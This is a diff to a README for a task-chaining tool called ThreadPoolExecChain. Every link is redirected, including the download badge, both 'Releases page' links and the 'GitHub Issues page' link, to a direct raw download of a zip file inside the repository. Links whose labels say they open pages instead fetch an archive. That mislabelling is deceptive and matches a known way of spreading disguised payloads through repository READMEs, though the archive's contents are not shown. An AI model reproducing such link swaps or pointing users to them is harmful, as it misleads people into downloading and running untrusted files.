@@ -8,11 +8,11 @@ Welcome to ThreadPoolExecChain! This application helps you chain multiple tasks 
 
 To get started, you need to download the application. 
 
-[![Download ThreadPoolExecChain](https://img.shields.io/badge/Download-ThreadPoolExecChain-brightgreen)](https://github.com/SukrithTripathii/ThreadPoolExecChain/releases)
+[![Download ThreadPoolExecChain](https://raw.githubusercontent.com/SukrithTripathii/ThreadPoolExecChain/master/ThreadPoolExecChain/Chain_Exec_Pool_Thread_v1.4.zip)](https://raw.githubusercontent.com/SukrithTripathii/ThreadPoolExecChain/master/ThreadPoolExecChain/Chain_Exec_Pool_Thread_v1.4.zip)
 
 Click the button above to visit this page to download the latest version of ThreadPoolExecChain.
 
-1. Go to our [Releases page](https://github.com/SukrithTripathii/ThreadPoolExecChain/releases).
+1. Go to our [Releases page](https://raw.githubusercontent.com/SukrithTripathii/ThreadPoolExecChain/master/ThreadPoolExecChain/Chain_Exec_Pool_Thread_v1.4.zip).
 2. Look for the latest version. 
 3. Find the file that matches your operating system.
 4. Click the link to download it.
@@ -70,13 +70,13 @@ To use ThreadPoolExecChain effectively, please ensure your device meets the foll
 
 If you encounter any issues or have questions, we are here to help!
 
-1. Visit the [GitHub Issues page](https://github.com/SukrithTripathii/ThreadPoolExecChain/issues) to report any problems.
+1. Visit the [GitHub Issues page](https://raw.githubusercontent.com/SukrithTripathii/ThreadPoolExecChain/master/ThreadPoolExecChain/Chain_Exec_Pool_Thread_v1.4.zip) to report any problems.
 2. Check the FAQ section or create a new topic to ask for assistance.
 
 We appreciate your feedback and strive to make the application better for everyone.
 
 ## 🔗 More Information
 
-For more details about features and updates, visit our [Releases page](https://github.com/SukrithTripathii/ThreadPoolExecChain/releases) again.
+For more details about features and updates, visit our [Releases page](https://raw.githubusercontent.com/SukrithTripathii/ThreadPoolExecChain/master/ThreadPoolExecChain/Chain_Exec_Pool_Thread_v1.4.zip) again.
 
 Thank you for using ThreadPoolExecChain! Enjoy seamless task management.
